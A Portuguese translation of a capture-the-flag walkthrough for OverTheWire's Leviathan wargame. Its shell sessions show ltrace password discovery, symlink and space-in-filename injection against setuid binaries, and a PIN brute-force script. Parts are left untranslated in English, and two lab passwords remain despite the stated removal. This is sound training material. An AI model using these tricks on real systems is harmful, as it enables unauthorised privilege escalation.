OverTheWire: Resolução do ‘Leviathan’ 1-8
======================================

Retirado de [**OverTheWire: ‘Leviathan’ Solutions 1-8**][26] por [**Jack Halon**][1].

Leviathan é um wargame que foi resgatado do extinto intruded.net, anteriormente hospedado em **leviathan.intruded.net**. Agora ele pode ser encontrado [aqui][10] no OverTheWire. Este wargame consiste de 8 níveis e é classificado como 1/10 em termos de dificuldade. Sendo também afirmado que "_Este wargame não requer nenhum conhecimento sobre programação, apenas um pouco de senso comum e conhecimento básco de comandos *nix._"

Embora toda a sua honestidade, ele requer um pouco mais do que é afirmado. Antes de começarmos, para qualquer um que esteja passando pelos níveis e tendo dificuldades, tudo o que posso dizer é - concentre-se na saída do código e utilize o comando [ltrace][11].

Então, vamos começar... vamos?

**Obs: Todas as flags deste guia foram removidas por motivos didáticos.**

### Level 0:

Para o primeiro nível nos devemos conectar no leviathan, então estabeleceremos uma conexão via SSH com o leviathan0 com o username: **leviathan0** e password: **leviathan0**,

    root@kali:~# ssh leviathan0@leviathan.labs.overthewire.org
    

### Level 0 -> 1:

OverTheWire nos provê apenas uma dica "Os dados para os níveis podem ser encontrados em **homedirectories**." Portanto, estamos por nossa conta!

Vejamos então o que temos em nosso diretório home.

    leviathan0@melinda:~$ ls -a
    .  ..  .backup  .bash_logout  .bashrc  .profile
    

**.backup** parece promissor, então vejamos se podemos encontrar alguma coisa dentro do diretório.

    leviathan0@melinda:~$ cd .backup
    leviathan0@melinda:~/.backup$ ls -a
    .  ..  bookmarks.html
    leviathan0@melinda:~/.backup$ grep leviathan1 bookmarks.html
    <DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is FLAG" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
    

Beleza, acabamos por encontrar a FLAG a partir do **bookmarks.html**. Então vamos para o nível seguinte, leviathan1!

### Level 1 -> 2:
Esse nível é bem fácil, e você pode usar inúmeros métodos para encontrar a flag. Mas primeiro, vejamos o que temos para trabalhar.

    leviathan1@melinda:~$ ls -a
    .  ..  .bash_logout  .bashrc  .profile  check
    

Nós podemos ver que o diretório home armazena um executável chamado **check**, portanto vamos executá-lo e ver o que acontece.

    leviathan1@melissa:~$ ./check
    password: 1234
    Wrong password, Good Bye ...
    

Hmm… Interessante, parece que o executável está verificando uma senha. Isto significa que o **check** está comparando a nossa entrada com algo que está *hardcoded*. Vamos rodar o comando `ltrace` e ver quais as chamadas de biblioteca desse programa.

    leviathan1@melinda:~$ ltrace ./check
    __libc_start_main(0x804852d, 1, 0xffffd7a4, 0x80485f0 <unfinished ...>
    printf("password: ")                             = 10
    getchar(0x8048680, 47, 0x804a000, 0x8048642password: 
    )     = 10
    getchar(0x8048680, 47, 0x804a000, 0x8048642
    )     = 10
    getchar(0x8048680, 47, 0x804a000, 0x8048642
    )     = 10
    strcmp("\n\n\n", "sex")                          = -1
    puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
    )             = 29
    +++ exited (status 0) +++
    

Olhando para a saída, podemos ver que o programa está utilizando a instrução `strcmp`, a qual é uma função de uma biblioteca da linguagem C que compara duas *strings*. Nesse executável é comparado a senha de entrada com a palavra "sex". Logo, vejamos se "sex" funcionará.

    leviathan1@melinda:~$ ./check
    password: sex
    $ whoami
    leviathan2
    $ cat /etc/leviathan_pass/leviathan2
    FLAG
    

E agora nós temos a FLAG! Se achou que até aqui foi difícil, pode aguardar que fica pior, seguimos então para o leviathan2!

### Level 2 -> 3:

Em minha honesta opinião este nível é realmente interessante, pois permite que se explore uma falha no executável. Isso me tomou um bom tempo e muita pesquisa no Google([Google Fu][12]) para finalmente descobrir como conseguir a FLAG de **/etc/leviathan_pass/leviathan3**.

    leviathan2@melinda:~$ ls -la
    total 28
    drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
    drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
    -rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
    -rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
    -rw-r--r--   1 root       root        675 Apr  9  2014 .profile
    -r-sr-x---   1 leviathan3 leviathan2 7498 Nov 14  2014 printfile
    leviathan2@melinda:~$ ./printfile
    *** File Printer ***
    Usage: ./printfile filename
    
Certo, então parece que o programa **printfile** imprime na saída o texto de um arquivo; assim como no comando `cat`. Portanto, podemos supor que o comando `cat` está sendo utilizando em algum lugar do código. Mesmo assim, espere um segundo... Eu prefiro buscar o caminho eficaz, do que ir pelo complicado. Vejamos se conseguimos ver a FLAG do **leviathan3** através do arquivo **/etc/leviathan_pass/** por meio do executável.

    leviathan2@melinda:~$ ./printfile /etc/leviathan_pass/leviathan3
    You cant have that file...
    

Parece que não. Vamos criar então um diretório temp, e um novo arquivo de texto que nós poderemos usar para testar o programa com o comando `ltrace`.

    leviathan2@melinda:~$ mkdir /tmp/jhalon && touch /tmp/jhalon/test.txt
    leviathan2@melinda:~$ cd /tmp/jhalon
    leviathan2@melinda:/tmp/jhalon$ ltrace ~/printfile test.txt
    __libc_start_main(0x804852d, 2, 0xffffd744, 0x8048600 <unfinished ...>
    access("test.txt", 4)                            = 0
    snprintf("/bin/cat test.txt", 511, "/bin/cat %s", "test.txt") = 17
    system("/bin/cat test.txt" <no return ...>
    --- SIGCHLD (Child exited) ---
    <... system resumed> )                           = 0
    +++ exited (status 0) +++
    

Pela saída do programa, nós podemos observar uma pequena brecha de segurança na forma como esse programa funciona. Se você olhar atentamente, será possível ver que a função `access()` e **/bin/cat** estão sendo chamadas na entrada do arquivo. O que o `access()` faz é checar as permissões baseadas no processo

What `access()` does is check permissions based on the process’ real user ID rather than the effective user ID.

To explain: The real user id is who you really are (the one who owns the process), and the effective user id is what the operating system looks at to make a decision on whether or not you are allowed to do something (most of the time, there are some exceptions).

And if we look back into the previous `ls -la` output, we can see that **printfile** is owned by **leviathan3**. So `access()` will call the process with **leviathan3’s** privileges.

Looking into the code we also see that **/bin/cat** is being called on the file to output the contents. While `access()` uses the full path’s filename, **/bin/cat** uses just the first part of the filename. (This is due to how the “ “ are set up in the program) What we can do here is try to add a space to a filename, and if we are correct, **/bin/cat** will read the file as 2 separate files.

    leviathan2@melinda:/tmp/jhalon$touch pass\ file.txt
    leviathan2@melinda:/tmp/jhalon$ ltrace ~/printfile "pass file.txt"
    __libc_start_main(0x804852d, 2, 0xffffd744, 0x8048600 <unfinished ...>
    access("pass file.txt", 4)                       = 0
    snprintf("/bin/cat pass file.txt", 511, "/bin/cat %s", "pass file.txt") = 22
    system("/bin/cat pass file.txt"/bin/cat: pass: No such file or directory
    /bin/cat: file.txt: No such file or directory
     <no return ...>
    --- SIGCHLD (Child exited) ---
    <... system resumed> )                           = 256
    +++ exited (status 0) +++
    

I was right! As you can see, **/bin/cat** calls “**pass file.txt**” as two separate files, “**pass**” and “**file.txt**”. We can actually exploit this! Let’s go ahead and create a [symbolic link][13] for the “**pass**” part in “**pass file.txt**”, and link it to **/etc/leviathan_pass/leviathan3**.

    leviathan2@melinda:/tmp/jhalon$ ln -s /etc/leviathan_pass/leviathan3 /tmp/jhalon/pass
    leviathan2@melinda:/tmp/jhalon$ ls -la
    total 7864
    drwxrwxr-x 2 leviathan2 leviathan2    4096 Sep 10 04:55 .
    drwxrwx-wt 1 root       root       8036352 Sep 10 04:55 ..
    lrwxrwxrwx 1 leviathan2 leviathan2      30 Sep 10 04:55 pass -> /etc/leviathan_pass/leviathan3
    -rw-rw-r-- 1 leviathan2 leviathan2       0 Sep 10 04:54 pass file.txt
    leviathan2@melinda:/tmp/jhalon$ ~/printfile "pass file.txt"
    Ahdiemoo1j
    /bin/cat: file.txt: No such file or directory
    

And bingo was his name, OH! We got the password for leviathan3! Go do a victory lap around the house, you deserved it!

### Level 3 -> 4:

This level was a bit easier than the previous one. Just use what you learned from the previous levels to your advantage. Let’s begin by seeing what we have at our disposal.

    leviathan3@melinda:~$ ls -la
    total 32
    drwxr-xr-x   2 root       root       4096 Mar 21  2015 .
    drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
    -rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
    -rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
    -rw-r--r--   1 root       root        675 Apr  9  2014 .profile
    -r-sr-x---   1 leviathan4 leviathan3 9962 Mar 21  2015 level3
    

Alright, we have another executable called **level3**, let’s run it and see what happens.

    leviathan3@melinda:~$ ./level3
    Enter the password> 1234
    bzzzzzzzzap. WRONG
    

Another password… great! Let’s go ahead and run `ltrace` to see what the library calls are for this program.

    leviathan3@melinda:~$ ltrace ./level3
    __libc_start_main(0x80485fe, 1, 0xffffd794, 0x80486d0 <unfinished ...>
    strcmp("h0no33", "kakaka")                       = -1
    printf("Enter the password> ")                   = 20
    fgets(Enter the password> 1234
    "1234\n", 256, 0xf7fc9c20)                 = 0xffffd58c
    strcmp("1234\n", "snlprintf\n")                  = -1
    puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
    )                       = 19
    +++ exited (status 0) +++
    

Looking at the `ltrace` we can see that `strcmp` is being called 2 times. This is trying to obfuscate us from the main password, but let’s focus on the one that compares our input. We can see that it tries to compare the input against “**snlprintf**”; let’s try it as the password.

    leviathan3@melinda:~$ ./level3
    Enter the password> snlprintf
    [You've got shell]!
    $ whoami
    leviathan4
    $ cat /etc/leviathan_pass/leviathan4
    vuH0coox6m
    

Wow, that was easier then pressing a Staples button! Okay… moving on to leviathan4!

### Level 4 -> 5:

As always, let’s see what we have to work with.

    leviathan4@melinda:~$ ls -la
    total 24
    drwxr-xr-x   3 root root       4096 Nov 14  2014 .
    drwxr-xr-x 172 root root       4096 Jul 10 14:12 ..
    -rw-r--r--   1 root root        220 Apr  9  2014 .bash_logout
    -rw-r--r--   1 root root       3637 Apr  9  2014 .bashrc
    -rw-r--r--   1 root root        675 Apr  9  2014 .profile
    dr-xr-x---   2 root leviathan4 4096 Nov 14  2014 .trash
    

**.trash** looks promising, let’s go ahead and see what’s stored in that directory.

    leviathan4@melinda:~$ cd .trash
    leviathan4@melinda:~/.trash$ ls -la
    total 16
    dr-xr-x--- 2 root       leviathan4 4096 Nov 14  2014 .
    drwxr-xr-x 3 root       root       4096 Nov 14  2014 ..
    -r-sr-x--- 1 leviathan5 leviathan4 7425 Nov 14  2014 bin
    leviathan4@melinda:~/.trash$ ./bin
    01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 
    

Interessante... É um saída binária. 
Interesting… it’s a Binary Output. Let’s go online, and use a Binary to ASCII converter. I used [RapidTables][14] to do my conversion. After converting the Binary, we get the FLAG.

Muito fácil, não é muito difícil se você souber para o que está olhando. Vamos para o leviathan5!

### Level 5 -> 6:

Bem, até agora nós tivemos alguns que eram fáceis e outros quera eram difíceis... vejamos o que nos aguarda no leviathan5.

    leviathan5@melinda:~$ ls -la
    total 28
    drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
    drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
    -rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
    -rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
    -rw-r--r--   1 root       root        675 Apr  9  2014 .profile
    -r-sr-x---   1 leviathan6 leviathan5 7634 Nov 14  2014 leviathan5
    

Outro executável, vamos executá-lo e ver o que acontece.

    leviathan5@melinda:~$ ./leviathan5
    Cannot find /tmp/file.log
    

Certo. Parece que o executável está tentando obter informações de um arquivo que não existe. Vamos rodar o comando `ltrace` e ver o que está sendo chamado.

    leviathan5@melinda:~$ ltrace ./leviathan5
    __libc_start_main(0x80485ed, 1, 0xffffd794, 0x8048690 <unfinished ...>
    fopen("/tmp/file.log", "r")                      = 0
    puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
    )                = 26
    exit(-1 <no return ...>
    +++ exited (status 255) +++
    

Interessante, parece que o executável está usando o comando `fopen`em **/tmp/file.log**. Criemos então um link simbólico de **/etc/leviathan_pass/levithan6** para o arquivo **/tmp/file.log**.

    leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
    leviathan5@melinda:~$ ./leviathan5
    FLAG
    

Bem fácil! Nós conseguimos a FLAG e agora podemos ir para o leviathan6!

### Level 6 -> 7:

Como sempre, vamos executar `ls -la` e ver o que temos para trabalhar.

    leviathan6@melinda:~$ ls -la
    total 28
    drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
    drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
    -rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
    -rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
    -rw-r--r--   1 root       root        675 Apr  9  2014 .profile
    -r-sr-x---   1 leviathan7 leviathan6 7484 Nov 14  2014 leviathan6
    leviathan6@melinda:~$ ./leviathan6
    usage: ./leviathan6 <4 digit code>
    


Outro executável, chocante... de fato. Este em particular, está solicitando um pin de 4 dígitos como entrada. Vamos tentar utilizar força bruta para encontrar o pin. Começaremos criando um diretório tmp e abrindo o editor de texto `nano` para escrever um shell script.

    leviathan6@melinda:~$ mkdir /tmp/jhalon
    leviathan6@melinda:~$ nano /tmp/jhalon/brute.sh
    

Nosso shell script será algo parecido com isso...

    #!/bin/bash
    
    for a in {0000..9999}
    do
    ~/leviathan6 $a
    done
    

Salve o script como `bash.sh` ou qualquer outro nome que desejar e use o comando `chmod` para atribuir permissão de execução ao arquivo. Uma vez feito isso, rode o script.

    leviathan6@melinda:/tmp/jhalon$ chmod +x brute.sh
    leviathan6@melinda:/tmp/jhalon$ ./brute.sh
    

Dê ao script ~20 segundos para rodar e você verá uma linha de comando vazia com `$` aparecendo...

    $ whoami 
    leviathan7
    $ cat /etc/leviathan_pass/leviathan7
    FLAG
    

Feito! Nós conseguimos a FLAG! Técnicamente este é o últmo nível... mas vamos dar uma olhada no leviathan7 para ver o que há lá.

### Level 7

    leviathan7@melinda:~$ ls -la
    total 24
    drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
    drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
    -rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
    -rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
    -rw-r--r--   1 root       root        675 Apr  9  2014 .profile
    -r--r-----   1 leviathan7 leviathan7  178 Nov 14  2014 CONGRATULATIONS
    leviathan7@melinda:~$ cat CON*
    Muito bem, você parece já ter usado um sistema *nix, agora tente algo mais desafiador.	
    

Parabéns! Você consquistou o **Leviathan**!

**Atualizado:** 09 de Setembro de 2016

© 2018 [Jack Halon][1]. Powered by [Jekyll][23] & [Minimal Mistakes][24].

**Traduzido e adaptado por [@dethaldox][27] em 16 de Maio de 2018.**

[1]: https://jhalon.github.io/
[2]: https://jhalon.github.io/posts.html
[3]: https://jhalon.github.io/categories.html
[4]: https://jhalon.github.io/about.html
[5]: http://overthewire.org/wargames/
[6]: mailto:jacek.halon@gmail.com
[7]: https://twitter.com/jack_halon
[8]: https://www.linkedin.com/in/jacek-halon-683912b0
[9]: https://github.com/jhalon/
[10]: http://overthewire.org/wargames/leviathan/
[11]: http://linux.die.net/man/1/ltrace
[12]: https://en.wiktionary.org/wiki/Google-fu
[13]: https://en.wikipedia.org/wiki/Symbolic_link
[14]: http://www.rapidtables.com/convert/number/binary-to-ascii.htm
[15]: https://twitter.com/intent/tweet?text=https://jhalon.github.io/over-the-wire-leviathan/ "Share on Twitter"
[16]: https://www.facebook.com/sharer/sharer.php?u=https://jhalon.github.io/over-the-wire-leviathan/ "Share on Facebook"
[17]: https://plus.google.com/share?url=https://jhalon.github.io/over-the-wire-leviathan/ "Share on Google Plus"
[18]: https://www.linkedin.com/shareArticle?mini=true&url=https://jhalon.github.io/over-the-wire-leviathan/ "Share on LinkedIn"
[19]: https://jhalon.github.io/over-the-wire-bandit2/ "OverTheWire: ‘Bandit’ Solutions 11-25 "
[20]: https://jhalon.github.io/over-the-wire-natas1/ "OverTheWire: ‘Natas’ Solutions 1-10 "
[21]: http://github.com/jhalon/
[22]: https://jhalon.github.io/feed.xml
[23]: http://jekyllrb.com
[24]: https://mademistakes.com/work/minimal-mistakes-jekyll-theme/
[25]: http://disqus.com/?ref_noscript
[26]: https://jhalon.github.io/over-the-wire-leviathan/
[27]: https://github.com/BrunoxD
